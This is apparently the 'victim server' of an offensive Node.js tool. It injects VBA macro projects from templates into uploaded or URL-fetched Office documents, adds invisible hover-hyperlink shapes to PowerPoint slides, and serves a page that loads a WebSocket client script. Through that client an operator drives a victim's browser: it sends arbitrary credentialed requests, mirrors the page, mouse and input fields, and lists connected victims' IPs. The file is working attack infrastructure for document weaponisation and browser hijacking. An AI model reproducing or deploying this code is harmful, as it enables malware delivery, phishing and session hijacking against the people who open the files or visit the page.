const express = require('express');
const http = require('http');
const https = require('https');
const WebSocket = require('ws');
const path = require('path');
const multer = require('multer');
const AdmZip = require('adm-zip');
const xml2js = require('xml2js');
const crypto = require('crypto');
const { pipeline } = require('stream');
const axios = require('axios');
const ssrfFilter = require('ssrf-req-filter');
const { eachDeep } = require('deepdash/standalone');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const { execSync } = require('child_process');
const cors = require('cors');

const app = express();
app.use(cors());

const sslEnabled = getConfigValue('sslEnabled');
const port = getPort('victimServerPort');

let wss;

app.use(express.urlencoded({ extended: true }));

const storage = multer.diskStorage({
  destination: 'public/files/',
  filename: (req, file, cb) => {
    const originalName = file.originalname;
    const fileId = uuidv4();
    const uniqueName = fileId + "-" + originalName;
    cb(null, uniqueName);
  },
});

const upload = multer({ storage: storage });

const templatesDir = path.join(__dirname, 'public', 'templates');
const extractedFilesDir = path.join(__dirname, 'public', 'extractedFiles');
const filesDir = path.join(__dirname, 'public', 'files');

const officeExtensions = {
  docx: 'docm',
  xlsx: 'xlsm',
  pptx: 'pptm',
  docm: 'docm',
  xlsm: 'xlsm',
  pptm: 'pptm',
  dotx: 'dotm',
  xlsb: 'xltm',
  potx: 'potm',
  dotm: 'dotm',
  xltm: 'xltm',
  potm: 'potm',
};

const hyperlinkActions = [
  'a:hlinkClick',
  'a:hlinkHover',
  'a:hlinkShowClick',
  'a:hlinkMouseOver'
];

const dynamicCors = cors({
  origin: function(origin, callback){
    return callback(null, true);
  },
  credentials: true
});

function getFileMD5(filePath) {
  return new Promise((resolve, reject) => {
    const hash = crypto.createHash('md5');
    const stream = fs.createReadStream(filePath);

    stream.on('data', chunk => hash.update(chunk));
    stream.on('end', () => resolve(hash.digest('hex')));
    stream.on('error', error => reject(error));
  });
}

function checkAndRemoveDuplicate(filePath) {
  getFileMD5(filePath).then(fileMD5 => {

    const extractedFilesDir = 'public/extractedFiles/';
    fs.readdir(extractedFilesDir, (err, files) => {
      if (err) {
        console.error("Error reading directory:", err);
        return;
      }

      for (const file of files) {
        const extractedFilePath = path.join(extractedFilesDir, file);
        
        if (extractedFilePath === filePath) {
          continue;
        }

        getFileMD5(extractedFilePath).then(currentMD5 => {

          if (currentMD5 === fileMD5) {
            fs.unlink(extractedFilePath, err => {
              if (err) {
                console.error("Error deleting file:", err);
                return;
              }
              
              const originalNameWithoutExtension = path.basename(file, path.extname(file));
              const newExt = officeExtensions[path.extname(file).substr(1)];
              const correspondingFile = path.join('public/files/', `${originalNameWithoutExtension}.${newExt}`);              

              fs.unlink(correspondingFile, err => {
                if (err) {
                  console.error("Error deleting file:", err);
                }
              });
            });
          }
        }).catch(err => {
          console.error("Error calculating MD5:", err);
        });
      }
    });
  }).catch(err => {
    console.error("Error calculating MD5:", err);
  });
}

function getOfficeFilePaths(extension) {
  switch (extension) {
    case 'docm':
    case 'dotm':
      return {
        vbaProjectPath: 'word/vbaProject.bin',
        relsPath: 'word/_rels/',
        vbaDataPath: 'word/vbaData.xml'
      };
    case 'xlsm':
    case 'xltm':
      return {
        vbaProjectPath: 'xl/vbaProject.bin',
        relsPath: 'xl/_rels/',
        vbaDataPath: 'xl/vbaData.xml'
      };
    case 'pptm':
    case 'potm':
      return {
        vbaProjectPath: 'ppt/vbaProject.bin',
        relsPath: 'ppt/_rels/',
        vbaDataPath: 'ppt/vbaData.xml'
      };
    default:
      return null;
  }
}

function addOrUpdateFile(zip, filePath, fileContent) {
  const fileExists = zip.getEntry(filePath) !== null;
  if (fileExists) {
    zip.updateFile(filePath, fileContent);
  } else {
    zip.addFile(filePath, fileContent);
  }
}

function mergeRelationshipFiles(zip, sourceZip, dirPath) {
  const sourceEntries = sourceZip.getEntries();
  const parser = new xml2js.Parser({ explicitArray: true });
  const builder = new xml2js.Builder({
    explicitArray: true,
    headless: false,
    renderOpts: {
      'pretty': false, 
      'indent': '',
      'newline': ''
    }
  });

  const relationshipsAreEqual = (rel1, rel2) => {
    return rel1['$']['Type'] === rel2['$']['Type'] && rel1['$']['Target'] === rel2['$']['Target'];
  };

  const findNextAvailableRId = (currentMaxRId, usedRIds) => {
    let nextRId;
    do {
      currentMaxRId++;
      nextRId = 'rId' + currentMaxRId;
    } while (usedRIds.has(nextRId));
    return nextRId;
  };

  let rIdMap = {};
  let differentRelationships = [];

  sourceEntries.forEach(sourceEntry => {
    if (sourceEntry.entryName.startsWith(dirPath) && !sourceEntry.isDirectory) {
      const sourceFileContent = sourceZip.readFile(sourceEntry);
      const targetEntry = zip.getEntry(sourceEntry.entryName);

      if (targetEntry) {
        const targetFileContent = zip.readFile(targetEntry);

        parser.parseString(sourceFileContent, (sourceErr, sourceResult) => {
          if (sourceErr) {
            console.error('Error parsing source XML', sourceErr);
            return;
          }

          parser.parseString(targetFileContent, (targetErr, targetResult) => {
            if (targetErr) {
              console.error('Error parsing target XML', targetErr);
              return;
            }

            const sourceRelationships = sourceResult['Relationships']['Relationship'] || [];
            const targetRelationships = targetResult['Relationships']['Relationship'] || [];

            sourceRelationships.forEach(sourceRel => {
              const isIdentical = targetRelationships.some(targetRel => relationshipsAreEqual(sourceRel, targetRel));
              
              if (!isIdentical) {
                differentRelationships.push(sourceRel);
              }
            });

            if (differentRelationships.length > 0) {
              let maxRIdInZip = targetRelationships.reduce((max, rel) => {
                const currentRId = parseInt(rel['$']['Id'].substring(3));
                return currentRId > max ? currentRId : max;
              }, 0);

              const usedRIds = new Set(targetRelationships.map(rel => rel['$']['Id']));

              differentRelationships.forEach(differentRel => {
                const newRId = findNextAvailableRId(maxRIdInZip, usedRIds);
                usedRIds.add(newRId);
                maxRIdInZip = parseInt(newRId.substring(3));

                rIdMap[differentRel['$']['Id']] = newRId;
                differentRel['$']['Id'] = newRId;

                targetRelationships.push(differentRel);
              });
              targetResult['Relationships']['Relationship'] = targetRelationships;
              const updatedContent = builder.buildObject(targetResult);
              zip.updateFile(targetEntry.entryName, Buffer.from(updatedContent));
            }
          });
        });
      } else {
        zip.addFile(sourceEntry.entryName, sourceFileContent);
      }
    }
  });
  
  return rIdMap;

}

async function handlePowerPointFiles(originalZip, templateZip, rIdRelation) {
  const parser = new xml2js.Parser({ explicitArray: true });
  const pptSlideDirPath = 'ppt/slides/';

  let hyperlinksFromTemplate = [];
  const templateEntries = templateZip.getEntries();

  templateEntries.forEach(entry => {
    if (entry.entryName.startsWith(pptSlideDirPath) && !entry.isDirectory) {
      const slideXmlContent = templateZip.readAsText(entry.entryName);
      parser.parseString(slideXmlContent, (err, result) => {
        if (err) {
          console.error(`Error parsing slide XML from template`, err);
          return;
        }

        eachDeep(result, (value, key, parent, context) => {
          if (hyperlinkActions.includes(key)) {
            hyperlinksFromTemplate.push(...value);
          }          
        });
      });
    }
  });

  const originalEntries = originalZip.getEntries();

  originalEntries.forEach(entry => {

    const isSlideFile = entry.entryName.startsWith(pptSlideDirPath) && !entry.isDirectory;
    const isRelsFile = entry.entryName.includes("/_rels/") && entry.entryName.endsWith(".xml.rels");

    if (isSlideFile && !isRelsFile) {
      const originalSlideContent = originalZip.readAsText(entry.entryName);

      parser.parseString(originalSlideContent, (err, result) => {
        if (err) {
          console.error(`Error parsing slide XML from original file`, err);
          return;
        }

        let spTree;
        eachDeep(result, (value, key, parent, context) => {
          if (key === 'p:spTree' && !spTree) {
            spTree = value; 
          }
        });

        eachDeep(result, (value, key, parent, context) => {
          if (key === 'r:id' && rIdRelation[value]) { 
            parent[key] = rIdRelation[value];
          }
        });

        if (!spTree) {
          console.error('No se pudo encontrar spTree en la diapositiva.');
          return;
        }

        const actionButton = {
          'p:sp': [{ 
            'p:nvSpPr': [{
              'p:cNvPr': [{ '$': { 'id': '4', 'name': 'ActionButton 1' } }],
              'p:cNvSpPr': [{ 'a:spLocks': [{ '$': { 'noGrp': '1' } }] }],
              'p:nvPr': [{}]
            }],
            'p:spPr': [{ 
              'a:xfrm': [{ 
                'a:off': [{ '$': { 'x': '0', 'y': '0' } }],
                'a:ext': [{ '$': { 'cx': '9144000', 'cy': '6858000' } }]
              }],
              'a:prstGeom': [{ '$': { 'prst': 'rect' } }], 
              'a:noFill': [{}], 
            }],
            'p:style': [{}],
            'p:txBody': [{ 'a:bodyPr': [], 'a:lstStyle': [], 'a:p': [] }],
            'p:click': [{ 'p:hyperlinkClick': [{}], '$': { 'action': 'ppActionNext' } }] 
          }]
        };

        if (!spTree[0]['p:sp'] || !Array.isArray(spTree[0]['p:sp'])) {
          spTree[0]['p:sp'] = [];
        }

        spTree[0]['p:sp'].push(actionButton['p:sp'][0]);

        actionButton['p:sp'][0]['p:nvSpPr'][0]['p:cNvPr'][0]['a:hlinkHover'] = hyperlinksFromTemplate;

        const builder = new xml2js.Builder({
          explicitArray: true,
          headless: false,
          renderOpts: {
            'pretty': false, 
            'indent': '',
            'newline': ''
          }
        });
        const updatedSlideContent = builder.buildObject(result);
        originalZip.updateFile(entry.entryName, Buffer.from(updatedSlideContent));
      });
    }
  });
}


function updateXMLContentForSheet(zip, filePath, templateXmlContent) {
  const originalFileContent = zip.readFile(filePath);
  const parser = new xml2js.Parser({explicitArray: true});
  let originalXml, templateXml;

  parser.parseString(originalFileContent, (err, result) => {
      if (err) {
          console.error(`Error parsing ${filePath}`, err);
          return;
      }
      originalXml = result;
  });

  parser.parseString(templateXmlContent, (err, result) => {
      if (err) {
          console.error(`Error parsing template XML`, err);
          return;
      }
      templateXml = result;
  });

  if (!originalXml || !templateXml) {
      console.error(`Unable to parse XMLs for ${filePath}`);
      return;
  }

  const templateSheetPr = templateXml['worksheet']['sheetPr'][0]['$'];

  const newSheetPr = {
      $: {}
  };

  if (templateSheetPr && templateSheetPr['codeName']) {
      newSheetPr['$']['codeName'] = templateSheetPr['codeName'];
  }

  originalXml['worksheet'] = {
      $: { ...originalXml['worksheet']['$'] },
      sheetPr: [newSheetPr],
      ...originalXml['worksheet']
  };

  const builder = new xml2js.Builder({explicitArray: true, headless: false});
  const updatedXmlContent = builder.buildObject(originalXml);

  zip.updateFile(filePath, Buffer.from(updatedXmlContent));
}

function addMacroToDocument(file, callback) {
  const extension = path.extname(file).substring(1);
  const newExtension = officeExtensions[extension];

  if (!newExtension) {
    return callback(new Error(`File extension ${extension} is not supported.`));
  }

  const templateFile = path.join(templatesDir, `template.${newExtension}`);
  if (!fs.existsSync(templateFile)) {
    return callback(new Error(`Template for ${newExtension} does not exist.`));
  }

  if (!fs.existsSync(extractedFilesDir)) {
    fs.mkdirSync(extractedFilesDir, { recursive: true });
  }
  if (!fs.existsSync(filesDir)) {
    fs.mkdirSync(filesDir, { recursive: true });
  }

  const { vbaProjectPath, relsPath, vbaDataPath } = getOfficeFilePaths(newExtension);
  const contentTypesPath = '[Content_Types].xml';

  const originalZip = new AdmZip(file);
  const templateZip = new AdmZip(templateFile);

  if(newExtension == "docm" || newExtension == "dotm"){

    const contentTypesFromTemplate = templateZip.readFile(contentTypesPath);
    const vbaProjectFromTemplate = templateZip.readFile(vbaProjectPath);
    const vbaDataFromTemplate = templateZip.readFile(vbaDataPath);

    addOrUpdateFile(originalZip, contentTypesPath, contentTypesFromTemplate);
    addOrUpdateFile(originalZip, vbaProjectPath, vbaProjectFromTemplate);
    addOrUpdateFile(originalZip, vbaDataPath, vbaDataFromTemplate);

    mergeRelationshipFiles(originalZip, templateZip, relsPath);

  }
  else if(newExtension == "xlsm" || newExtension == "xltm"){

    const contentTypesFromTemplate = templateZip.readFile(contentTypesPath);
    const vbaProjectFromTemplate = templateZip.readFile(vbaProjectPath);

    addOrUpdateFile(originalZip, contentTypesPath, contentTypesFromTemplate);
    addOrUpdateFile(originalZip, vbaProjectPath, vbaProjectFromTemplate);

    mergeRelationshipFiles(originalZip, templateZip, relsPath);

    const worksheetDirPath = 'xl/worksheets/';
    const templateEntries = templateZip.getEntries();
    
    templateEntries.forEach(entry => {
        if (entry.entryName.startsWith(worksheetDirPath) && !entry.isDirectory) {
            const worksheetTemplateContent = templateZip.readFile(entry.entryName);
            updateXMLContentForSheet(originalZip, entry.entryName, worksheetTemplateContent);
        }
    });
  }
  else if(newExtension == "pptm" || newExtension == "potm"){

    const contentTypesFromTemplate = templateZip.readFile(contentTypesPath);
    const vbaProjectFromTemplate = templateZip.readFile(vbaProjectPath);

    addOrUpdateFile(originalZip, contentTypesPath, contentTypesFromTemplate);
    addOrUpdateFile(originalZip, vbaProjectPath, vbaProjectFromTemplate);

    rIdRelation = mergeRelationshipFiles(originalZip, templateZip, relsPath);

    handlePowerPointFiles(originalZip, templateZip, rIdRelation);    
  }

  const newFileName = path.basename(file, `.${extension}`) + `.${newExtension}`;
  const newFilePath = path.join(filesDir, newFileName);
  originalZip.writeZip(newFilePath);

  const originalFileDestination = path.join(extractedFilesDir, path.basename(file));
  fs.renameSync(file, originalFileDestination);

  return callback(null, newFilePath);
}

function getPort(configKey) {
  const config = readConfig();
  return config[configKey];
}

function getConfigValue(configKey) {
  const config = readConfig();
  return config[configKey];
}

function readConfig() {
  let config;
  try {
    config = JSON.parse(fs.readFileSync('files/config.json'));
  } catch (err) {
    if (err.code === 'ENOENT') {
      console.log('No configuration found. Running "npm run setConfig" ...');
      execSync('npm run setConfig', { stdio: 'inherit' });
      config = JSON.parse(fs.readFileSync('files/config.json'));
    } else {
      throw err;
    }
  }

  return config;
}

function filterHeaders(headers) {
  const forbiddenHeaders = [
    "shve-authentication",
    "shve",
    "host",
    "connection",
    "accept-encoding",
    "referer",
    "sec-fetch-dest",
    "sec-fetch-mode",
    "sec-fetch-site",
    "user-agent",
    "sec-ch-ua",
    "sec-ch-ua-mobile",
    "sec-ch-ua-platform",
    "sec-fetch-user",
    "content-length",
    "origin",
  ];

  return Object.keys(headers)
  .filter((key) => !forbiddenHeaders.includes(key.toLowerCase()))
  .reduce((obj, key) => {
    obj[key] = headers[key];
    return obj;
  }, {});
}

app.use('/client', async function(req, res) {
  const scriptPath = path.join(__dirname, 'public', 'client.js');
  let script = fs.readFileSync(scriptPath, 'utf8');
  
  const wsProtocol = sslEnabled ? 'wss' : 'ws';
  const httpProtocol = sslEnabled ? 'https' : 'http';
  const ip = req.query.ip;
  const port = await getPort('victimServerPort');

  script = script.replace(/'\{websocket_direction\}'/g, `'${wsProtocol}://${ip}:${port}'`);
  script = script.replace(/'\{http_direction\}'/g, `${httpProtocol}://${ip}:${port}`);
  
  res.setHeader('Content-Type', 'application/javascript');
  res.send(script);
});


app.post('/upload', upload.single('file'), dynamicCors, (req, res) => {
  const file = req.file;
  if (!file) {
    return res.status(400).send('File not sent');
  }

  const filePath = `public/files/${file.filename}`;

  checkAndRemoveDuplicate(`public/extractedFiles/${file.filename}`);

  addMacroToDocument(filePath, (err, message) => {
    if (err) {
      console.error(err);
      return res.status(500).send('Error loading the macro.');
    }

    const downloadLink = `/downloads/${file.filename.split('-').slice(0, 5).join('-')}`;
    res.send({ link: downloadLink });
  });
});

app.post('/upload-via-url', dynamicCors, async (req, res) => {
  const fileUrl = req.body.url;

  if (!fileUrl) {
    return res.status(400).send('No URL provided');
  }

  try {
    const response = await axios.get(fileUrl, {
      responseType: 'stream',
      httpAgent: ssrfFilter(fileUrl), 
      httpsAgent: ssrfFilter(fileUrl)
    });

    const contentDisposition = response.headers['content-disposition'];
    
    
    let filename = contentDisposition ? contentDisposition.split('filename=')[1] : null;
    filename = filename ? filename.replace(/['"]+/g, '') : null;

    if (!filename) {
        filename = path.basename(new URL(fileUrl).pathname);
    }

    const fileExtension = path.extname(filename).substr(1);

    if (!Object.keys(officeExtensions).includes(fileExtension)) {
      return res.status(400).send('Invalid file type. Only Office files are allowed.');
    }

    const fileId = uuidv4();
    const uniqueFilename = `${fileId}-${filename}`; 
    const localFilePath = path.join('public/files', uniqueFilename);
    const writer = fs.createWriteStream(localFilePath);

    pipeline(response.data, writer, (err) => {
      if (err) {
        console.error('File saving failed:', err);
        return res.status(500).send('Failed to save the file');
      }

      checkAndRemoveDuplicate(`public/extractedFiles/${fileId}-${filename}`);;

      addMacroToDocument(localFilePath, (err, message) => {
        if (err) {
          console.error(err);
          return res.status(500).send('Error loading the macro.');
        }
        const downloadLink = `/downloads/${uniqueFilename.split('-').slice(0, 5).join('-')}`;
        res.send({ link: downloadLink });
      });
    });

  } catch (error) {
    console.error('Error during file download or SSRF filtering:', error);
    return res.status(500).send('Failed to download the file');
  }
});


app.get('/downloads/:uuid', (req, res) => {
  const uuid = req.params.uuid;
  const filesInDirectory = fs.readdirSync('public/files');

  if (uuid.length !== 36) {
    return res.status(400).send('Invalid UUID length');
  }

  const matchingFile = filesInDirectory.find((file) => file.startsWith(uuid));

  if (matchingFile) {
    const originalName = matchingFile.split('-').slice(5).join('-');

    const filePath = `public/files/${matchingFile}`;
    res.download(filePath, originalName);
  } else {
    res.status(404).send('File not found');
  }
});

app.get('/connect', (req, res) => {
  fs.readFile(path.join(__dirname, 'public', 'templates', 'template.html'), 'utf8', (err, data) => {
      if (err) {
          res.status(500).send('Error al leer el archivo');
          return;
      }
      
      const appendedScript = `
          <script>
          var script = document.createElement('script');
          script.src = "/client?ip=" + document.domain;
          document.head.appendChild(script);
          </script>
      `;

      const modifiedData = data.replace('</body>', appendedScript + '</body>');
      res.send(modifiedData);
  });
});

  function startListening(shve) {
    const ws = Array.from(wss.clients).find((client) => client.id === shve);
    if (ws) {
      const message = JSON.stringify({
        listening: 'on',
      });
      ws.send(message);
    } else {
      console.log(`Websocket ${shve} not found`);
    }
  }
  
  function stopListening(shve) {
    const ws = Array.from(wss.clients).find((client) => client.id === shve);
    if (ws) {
      const message = JSON.stringify({
        listening: 'off',
      });
      ws.send(message);
    } else {
      console.log(`Websocket ${shve} not found`);
    }
  }
  
  function handleConnection(ws, req) {
      const clientId = uuidv4();
      ws.id = clientId;
      ws.userAgent = req.headers['user-agent'];
      ws.ip = req.socket.remoteAddress;

      console.log(`New client connected (ID: ${clientId})`);

      ws.on('close', () => {
        console.log(`Client ${ws.id} lost`);
      });

      ws.on('message', (message) => {
        handleMessage(ws.id, message);
      });
  }

function handleMessage(wsId, message) {
  const { writeDom, setMouse, setScroll, setInput } = require('./attackerServer');
  try {
    const parsedMessage = JSON.parse(message);
    if (parsedMessage.writeDom) {
      const { data, baseURL } = parsedMessage.writeDom;
      writeDom(wsId, data, baseURL);
    } else if (parsedMessage.setMouse) {
      const { mouseX, mouseY } = parsedMessage.setMouse;
      setMouse(wsId, mouseX, mouseY);
    } else if (parsedMessage.setScroll) {
      const { scrollY } = parsedMessage.setScroll;
      setScroll(wsId, scrollY);
    } else if (parsedMessage.setInput) {
      const { inputValue, inputPath } = parsedMessage.setInput;
      setInput(wsId, inputValue, inputPath);
    }
    
  } catch (error) {
    console.error(error);
  }
}

function getConnectedClients() {
  return Array.from(wss.clients)
    .filter(client => client.readyState === WebSocket.OPEN)
    .map(client => ({
      id: client.id,
      readyState: client.readyState,
      userAgent: client.userAgent,
      ip: client.ip,
    }));
}

function sendWebSocketRequest(wsId, method, url, headers = {}, postData = null) {
  const requestId = uuidv4();
  const cleanedHeaders = filterHeaders(headers);
  const data = {
    requestId,
    method,
    url,
    headers: cleanedHeaders,
  };
  if (postData) {
    data.data = postData;
  }
  const message = JSON.stringify({
    sendRequest: data,
  });

  const ws = Array.from(wss.clients).find((client) => client.id === wsId);
  if (ws) {
    return new Promise((resolve, reject) => {
      ws.send(message);

      const onResponse = (response) => {
        try {
          const responseData = JSON.parse(response);
          if (responseData.requestId === requestId) {
            ws.off('message', onResponse);
            if (responseData.error) {
              resolve(responseData);
            } else {
              resolve({
                data: responseData.data,
                headers: responseData.headers,
                status_code: responseData.status_code,
              });
            }
          }
        } catch (err) {
          reject({ error: err.message, statusCode: -1 });
        }
      };

      ws.on('message', onResponse);
    });
  } else {
    console.log(`Websocket ${wsId} not found`);
    return({ error: 'Websocket ' + wsId + ' not found', statusCode: -1 });
  }
}

module.exports = {
  startServer: () => {
    if (sslEnabled) {
      const privateKey = fs.readFileSync('files/privateKey.pem', 'utf8');
      const certificate = fs.readFileSync('files/certificate.pem', 'utf8');
      const credentials = { key: privateKey, cert: certificate };
      const httpsServer = https.createServer(credentials, app);
      wss = new WebSocket.Server({ server: httpsServer });
      httpsServer.listen(port, () => {
        console.log(`Victim server running on 0.0.0.0:${port} with SSL enabled`);
      });
    } else {
      const server = http.createServer(app);
      wss = new WebSocket.Server({ server });
      server.listen(port, () => {
        console.log(`Victim server running on 0.0.0.0:${port}`);
      });
    }
    wss.on('connection', handleConnection);
  },

  getConnectedClients,
  sendWebSocketRequest,
  startListening,
  stopListening,
};